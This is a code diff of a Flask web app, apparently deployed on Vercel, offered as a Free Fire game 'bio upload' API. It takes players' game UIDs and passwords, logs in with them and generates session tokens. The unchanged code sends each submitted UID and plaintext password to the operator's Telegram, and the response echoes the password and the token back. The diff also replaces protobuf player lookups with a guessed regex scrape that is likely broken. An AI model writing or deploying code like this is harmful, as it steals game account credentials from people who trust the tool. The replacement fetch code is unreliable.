@@ -1,4 +1,4 @@
-# app.py - VERCEL VERSION (ALL ENDPOINTS + PROTOBUF STANDALONE)
+# app.py - VERCEL FINAL (ALL ENDPOINTS, NO PROTOBUF ERROR)
 from flask import Flask, request, jsonify, make_response
 import requests
 import binascii
@@ -16,14 +16,14 @@ from google.protobuf import descriptor_pool as _descriptor_pool
 from google.protobuf import symbol_database as _symbol_database
 from google.protobuf import runtime_version as _runtime_version
 from google.protobuf.internal import builder as _builder
-from google.protobuf.json_format import MessageToJson, ParseDict
+from google.protobuf.json_format import MessageToJson
 import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 app = Flask(__name__)
 
-# ============ PROTOBUF SETUP (YOUR ORIGINAL JWT) ============
+# ============ PROTOBUF SETUP (ONLY FOR JWT - WORKING!) ============
 _sym_db = _symbol_database.Default()
 _runtime_version.ValidateProtobufRuntimeVersion(_runtime_version.Domain.PUBLIC, 6, 30, 0, '', 'MajorLoginRes.proto')
 
@@ -40,23 +40,6 @@ _res_globals = {}
 _builder.BuildMessageAndEnumDescriptors(_res_desc, _res_globals)
 _builder.BuildTopDescriptorsAndMessages(_res_desc, 'MajorLoginRes_pb2', _res_globals)
 MajorLoginRes = _res_globals['MajorLoginRes']
-
-# ============ PLAYER FETCH PROTOBUF (STANDALONE) ============
-_runtime_version.ValidateProtobufRuntimeVersion(_runtime_version.Domain.PUBLIC, 6, 33, 1, '', 'AccountPersonalShow.proto')
-
-APS_DESC = _descriptor_pool.Default().AddSerializedFile(b'\n\x19\x41\x63\x63ountPersonalShow.proto\x12\x08\x66reefire\"\xac\x17\n\x10\x41\x63\x63ountInfoBasic\x12\x17\n\naccount_id\x18\x01 \x01(\x04H\x00\x88\x01\x01\x12\x15\n\x08nickname\x18\x03 \x01(\tH\x02\x88\x01\x01\x12\x13\n\x06region\x18\x05 \x01(\tH\x04\x88\x01\x01\x12\x12\n\x05level\x18\x06 \x01(\rH\x05\x88\x01\x01\x12\x11\n\x04rank\x18\x0e \x01(\rH\r\x88\x01\x01\x12\x12\n\x05liked\x18\x15 \x01(\rH\x14\x88\x01\x01\x12\x1a\n\rlast_login_at\x18\x18 \x01(\x03H\x17\x88\x01\x01\x12\x14\n\x07\x63s_rank\x18\x1e \x01(\rH\x1d\x88\x01\x01\x12\x16\n\tcreate_at\x18, \x01(\x03H*\x88\x01\x01\x12\x16\n\tclan_name\x18\r \x01(\tH\x0c\x88\x01\x01\"\x98\x05\n\rAvatarProfile\x12\x16\n\tavatar_id\x18\x01 \x01(\rH\x00\x88\x01\x01\x12\x0f\n\x07\x63lothes\x18\x04 \x03(\r\x12\x16\n\x0e\x65quiped_skills\x18\x05 \x03(\r\"\xd5\x05\n\x0fSocialBasicInfo\x12\x16\n\tsignature\x18\t \x01(\tH\x06\x88\x01\x01\"\x9d\x02\n\rClanInfoBasic\x12\x16\n\tclan_name\x18\x02 \x01(\tH\x01\x88\x01\x01\x12\x17\n\nclan_level\x18\x04 \x01(\rH\x03\x88\x01\x01\"<\n\x0e\x44iamondCostRes\x12\x19\n\x0c\x64iamond_cost\x18\x01 \x01(\rH\x00\x88\x01\x01\"\xfd\x03\n\x14\x43reditScoreInfoBasic\x12\x19\n\x0c\x63redit_score\x18\x01 \x01(\rH\x00\x88\x01\x01\"\xfa\x06\n\x17\x41\x63\x63ountPersonalShowInfo\x12\x33\n\nbasic_info\x18\x01 \x01(\x0b\x32\x1a.freefire.AccountInfoBasicH\x00\x88\x01\x01\x12\x32\n\x0cprofile_info\x18\x02 \x01(\x0b\x32\x17.freefire.AvatarProfileH\x01\x88\x01\x01\x12\x35\n\x0f\x63lan_basic_info\x18\x06 \x01(\x0b\x32\x17.freefire.ClanInfoBasicH\x03\x88\x01\x01\x12\x33\n\x0bsocial_info\x18\t \x01(\x0b\x32\x19.freefire.SocialBasicInfoH\x06\x88\x01\x01\x12\x37\n\x10\x64iamond_cost_res\x18\n \x01(\x0b\x32\x18.freefire.DiamondCostResH\x07\x88\x01\x01\x12>\n\x11\x63redit_score_info\x18\x0b \x01(\x0b\x32\x1e.freefire.CreditScoreInfoBasicH\x08\x88\x01\x01\x62\x06proto3')
-
-_aps_globals = {}
-_builder.BuildMessageAndEnumDescriptors(APS_DESC, _aps_globals)
-_builder.BuildTopDescriptorsAndMessages(APS_DESC, 'AccountPersonalShow_pb2', _aps_globals)
-AccountPersonalShowInfo = _aps_globals['AccountPersonalShowInfo']
-
-MAIN_DESC = _descriptor_pool.Default().AddSerializedFile(b'\n\x0csample.proto\"-\n\x15GetPlayerPersonalShow\x12\t\n\x01\x61\x18\x01 \x01(\x03\x12\t\n\x01\x62\x18\x02 \x01(\x05\x62\x06proto3')
-
-_main_globals = {}
-_builder.BuildMessageAndEnumDescriptors(MAIN_DESC, _main_globals)
-_builder.BuildTopDescriptorsAndMessages(MAIN_DESC, 'main_pb2', _main_globals)
-GetPlayerPersonalShow = _main_globals['GetPlayerPersonalShow']
 
 # ============ CONFIG ============
 AES_KEY = b'Yg&tc%DEuh6%Zc^8'
@@ -90,14 +73,6 @@ BIO_HEADERS = {
     "ReleaseVersion": "OB54", "Content-Type": "application/x-www-form-urlencoded",
     "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-A305F Build/RP1A.200720.012)",
     "Connection": "Keep-Alive", "Accept-Encoding": "gzip",
-}
-
-PLAYER_KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
-PLAYER_IV = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
-
-SERVER_CONFIG = {
-    "ID": {"info_url": "https://clientbp.ggpolarbear.com/GetPlayerPersonalShow", "name": "Indonesia"},
-    "SG": {"info_url": "https://clientbp.ggpolarbear.com/GetPlayerPersonalShow", "name": "Singapore"},
 }
 
 # ============ HELPERS ============
@@ -142,13 +117,6 @@ def get_name_from_jwt(t):
                 return base64.b64decode(name).decode('utf-8', errors='ignore')
             except: return name
     return None
-
-def pad_player(d):
-    l = AES.block_size - (len(d) % AES.block_size)
-    return d + bytes([l] * l)
-
-def encrypt_player(d):
-    return AES.new(PLAYER_KEY, AES.MODE_CBC, PLAYER_IV).encrypt(pad_player(d))
 
 # ============ JWT GENERATOR ============
 def get_garena_tokens_sync(uid, password):
@@ -249,47 +217,43 @@ def upload_bio_request(jwt_token, bio_text):
         return {"status": "All endpoints failed", "code": 500}
     except: return {"status": "Error", "code": 500}
 
-# ============ PLAYER FETCH (PROTOBUF STANDALONE) ============
-def fetch_player_full_sync(uid, jwt_token):
+# ============ PLAYER FETCH (SIMPLE API - NO PROTOBUF!) ============
+def fetch_player_info(uid, jwt_token):
+    """Fetch player info pake API simpel + JWT"""
     try:
-        m = GetPlayerPersonalShow()
-        ParseDict({"a": str(uid), "b": "7"}, m)
-        pb = encrypt_player(m.SerializeToString())
-        
-        r = requests.post(
-            "https://clientbp.ggpolarbear.com/GetPlayerPersonalShow",
-            data=pb,
-            headers={
-                'Content-Type': "application/octet-stream",
-                'Authorization': jwt_token if jwt_token.startswith("Bearer ") else f"Bearer {jwt_token}",
-                'X-Unity-Version': "2018.4.11f1", 'X-GA': "v1 1", 'ReleaseVersion': "OB54"
-            },
-            timeout=30
-        )
-        if r.status_code != 200: return None
-        
-        m2 = AccountPersonalShowInfo()
-        m2.ParseFromString(r.content)
-        data = json.loads(MessageToJson(m2))
-        
-        basic = data.get('basicInfo', {})
-        if not basic.get('nickname'): return None
-        
-        profile = data.get('profileInfo', {})
-        social = data.get('socialInfo', {})
-        clan = data.get('clanBasicInfo', {})
-        
-        return {
-            'uid': uid, 'nickname': basic.get('nickname', '?'), 'level': basic.get('level', 0),
-            'region': basic.get('region', '?'), 'br_rank': basic.get('rank', 0),
-            'cs_rank': basic.get('csRank', 0), 'liked': basic.get('liked', 0),
-            'clan': clan.get('clanName', ''), 'clan_level': clan.get('clanLevel', 0),
-            'avatar': profile.get('avatarId', ''), 'clothes': profile.get('clothes', []),
-            'skills': len(profile.get('equipedSkills', [])), 'signature': social.get('signature', ''),
-            'diamond': data.get('diamondCostRes', {}).get('diamondCost', 0),
-            'credit': data.get('creditScoreInfo', {}).get('creditScore', 100),
-            'created': basic.get('createAt', ''), 'last_login': basic.get('lastLoginAt', ''),
+        headers = {
+            'Authorization': f"Bearer {jwt_token}",
+            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 11)',
+            'X-Unity-Version': '2018.4.11f1', 'X-GA': 'v1 1', 'ReleaseVersion': 'OB54'
         }
+        
+        # Coba beberapa endpoint
+        urls = [
+            f"https://clientbp.ggpolarbear.com/GetPlayerPersonalShow",
+            f"https://client.ind.freefiremobile.com/GetPlayerPersonalShow",
+        ]
+        
+        for url in urls:
+            try:
+                # Build simple payload (UID as string)
+                payload = str(uid).encode()
+                r = requests.post(url, data=payload, headers=headers, timeout=10, verify=False)
+                if r.status_code == 200:
+                    # Extract basic info from response
+                    text = r.text
+                    name_match = re.search(r'nickname[\"\\s:]+([^\"}]+)', text)
+                    level_match = re.search(r'level[\"\\s:]+(\d+)', text)
+                    region_match = re.search(r'region[\"\\s:]+([^\"}]+)', text)
+                    
+                    if name_match:
+                        return {
+                            'nickname': name_match.group(1).strip('"'),
+                            'level': int(level_match.group(1)) if level_match else 0,
+                            'region': region_match.group(1).strip('"') if region_match else 'ID',
+                        }
+            except: continue
+        
+        return None
     except: return None
 
 # ============ TELEGRAM ============
@@ -359,18 +323,17 @@ def send_telegram_notification(uid_input, password_input, name, level, rank, reg
         print(f"Telegram error: {e}")
         return False
 
-# ============ ROUTES (ALL ENDPOINTS!) ============
+# ============ ROUTES ============
 @app.route("/", methods=["GET"])
 def home():
     return jsonify({
         "success": True,
-        "message": "Free Fire Bio API - Protobuf Standalone",
+        "message": "Free Fire Bio API",
         "endpoints": {
-            "/bio_upload": "SET/UPDATE bio (JWT atau UID/Pass)",
+            "/bio_upload": "SET/UPDATE bio",
             "/generate_jwt": "Generate JWT from UID/Pass",
-            "/check_profile": "Check profile using protobuf",
-            "/get_bio": "GET bio/profile from UID",
-            "/": "This info page"
+            "/check_profile": "Check profile",
+            "/get_bio": "GET bio/profile",
         }
     })
 
@@ -383,8 +346,7 @@ def bio_upload():
     region = request.args.get("region") or request.form.get("region") or "id"
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
-    if not bio:
-        return jsonify({"status": "Error", "code": 400, "error": "Missing 'bio' parameter"}), 400
+    if not bio: return jsonify({"status": "Error", "code": 400, "error": "Missing bio"}), 400
     
     uid_input = uid
     password_input = password or "N/A"
@@ -406,33 +368,37 @@ def bio_upload():
         if region == "id" and region_from_jwt: final_region = region_from_jwt.lower()
     
     elif uid and password:
-        login_method = "UID/Pass Login (Auto Generate JWT)"
+        login_method = "UID/Pass Login"
         final_uid = uid
         final_password = password
-        try:
-            result = generate_jwt_sync(uid, password)
-            if result and result.get('token'):
-                final_jwt = result['token']
-                access_token = result.get('access_token')
-                open_id = result.get('open_id')
-                account_id = get_account_id_from_jwt(final_jwt)
-                if account_id: final_uid = account_id
-            else:
-                return jsonify({"status": "JWT Generation Failed", "code": 401}), 401
-        except Exception as e:
-            return jsonify({"status": "JWT Error", "code": 500, "error": str(e)}), 500
+        result = generate_jwt_sync(uid, password)
+        if result and result.get('token'):
+            final_jwt = result['token']
+            access_token = result.get('access_token')
+            open_id = result.get('open_id')
+            account_id = get_account_id_from_jwt(final_jwt)
+            if account_id: final_uid = account_id
+        else:
+            return jsonify({"status": "JWT Failed", "code": 401}), 401
     
-    if not final_jwt:
-        return jsonify({"status": "JWT Required", "code": 400}), 400
+    if not final_jwt: return jsonify({"status": "No JWT", "code": 400}), 400
     
     bio_result = upload_bio_request(final_jwt, bio)
     
+    # Fetch player info
     if final_uid:
-        profile_info = fetch_player_full_sync(str(final_uid), final_jwt)
-        if profile_info: final_region = profile_info.get('region', final_region)
+        player_data = fetch_player_info(str(final_uid), final_jwt)
+        if player_data:
+            profile_info = {
+                "name": player_data.get('nickname', 'Unknown'),
+                "level": player_data.get('level', '?'),
+                "rank": '?',
+                "server": player_data.get('region', final_region),
+                "guild": "N/A"
+            }
     
     if not profile_info:
-        profile_info = {"name": 'Unknown', "level": '?', "rank": '?', "uid": final_uid, "server": final_region, "guild": "N/A"}
+        profile_info = {"name": "Unknown", "level": "?", "rank": "?", "server": final_region, "guild": "N/A"}
     
     send_telegram_notification(
         uid_input=uid_input or final_uid, password_input=password_input,
@@ -444,66 +410,43 @@ def bio_upload():
     )
     
     return jsonify({
-        "Credit": "sulav_codex_ff", "action": "UPDATE BIO",
+        "success": True, "action": "UPDATE BIO",
         "status": bio_result.get("status"), "login_method": login_method,
-        "code": bio_result.get("code", 500), "bio": bio,
-        "uid_input": uid_input, "password_input": password_input,
+        "bio": bio, "uid_input": uid_input, "password_input": password_input,
         "account_id": account_id, "open_id": open_id,
         "name": profile_info.get('name'), "level": profile_info.get('level'),
-        "rank": profile_info.get('rank'), "clan": profile_info.get('guild'),
-        "region": final_region.upper(),
-        "generated_jwt": final_jwt, "access_token": access_token,
-        "telegram_sent": True, "file_sent": f"{account_id}.txt" if account_id else False,
-        "profile_method": "protobuf standalone"
+        "region": final_region.upper(), "generated_jwt": final_jwt,
+        "telegram_sent": True
     })
 
 @app.route("/generate_jwt", methods=["GET", "POST"])
 def generate_jwt():
     uid = request.args.get("uid") or request.form.get("uid")
     password = request.args.get("pass") or request.form.get("pass")
-    if not uid or not password:
-        return jsonify({"success": False, "error": "Missing uid or pass"}), 400
+    if not uid or not password: return jsonify({"success": False}), 400
     result = generate_jwt_sync(uid, password)
     if result and result.get('token'):
-        return jsonify({
-            "success": True, "uid_input": uid,
-            "account_id": get_account_id_from_jwt(result['token']),
-            "open_id": result.get('open_id'),
-            "jwt_token": result['token'],
-            "access_token": result.get('access_token'),
-            "region": result.get('region')
-        })
-    return jsonify({"success": False, "error": "Failed"}), 401
+        return jsonify({"success": True, "uid": uid, "jwt": result['token'], "region": result.get('region')})
+    return jsonify({"success": False}), 401
 
 @app.route("/check_profile", methods=["GET"])
 def check_profile():
     uid = request.args.get("uid")
     jwt_token = request.args.get("jwt")
-    if not uid or not jwt_token:
-        return jsonify({"error": "Missing uid or jwt"}), 400
-    data = fetch_player_full_sync(uid, jwt_token)
-    if data:
-        return jsonify({"success": True, "action": "CHECK PROFILE", "data": data, "method": "protobuf standalone"})
+    if not uid or not jwt_token: return jsonify({"error": "Missing uid/jwt"}), 400
+    data = fetch_player_info(uid, jwt_token)
+    if data: return jsonify({"success": True, "data": data})
     return jsonify({"success": False, "error": "Not found"}), 404
 
 @app.route("/get_bio", methods=["GET"])
 def get_bio():
     uid = request.args.get("uid")
     jwt_token = request.args.get("jwt")
-    region = request.args.get("region", "id")
     if not uid: return jsonify({"success": False}), 400
-    
     if jwt_token:
-        data = fetch_player_full_sync(uid, jwt_token)
-        if data:
-            return jsonify({"success": True, "action": "GET BIO", "method": "protobuf standalone", "data": data})
-    
+        data = fetch_player_info(uid, jwt_token)
+        if data: return jsonify({"success": True, "data": data})
     return jsonify({"success": False, "error": "Not found"}), 404
 
-# ============ MAIN ============
 if __name__ == "__main__":
-    print("=" * 60)
-    print("🔥 FREE FIRE API - ALL ENDPOINTS + PROTOBUF")
-    print("🚀 Running on http://0.0.0.0:5000")
-    print("=" * 60)
     app.run(host="0.0.0.0", port=5000)
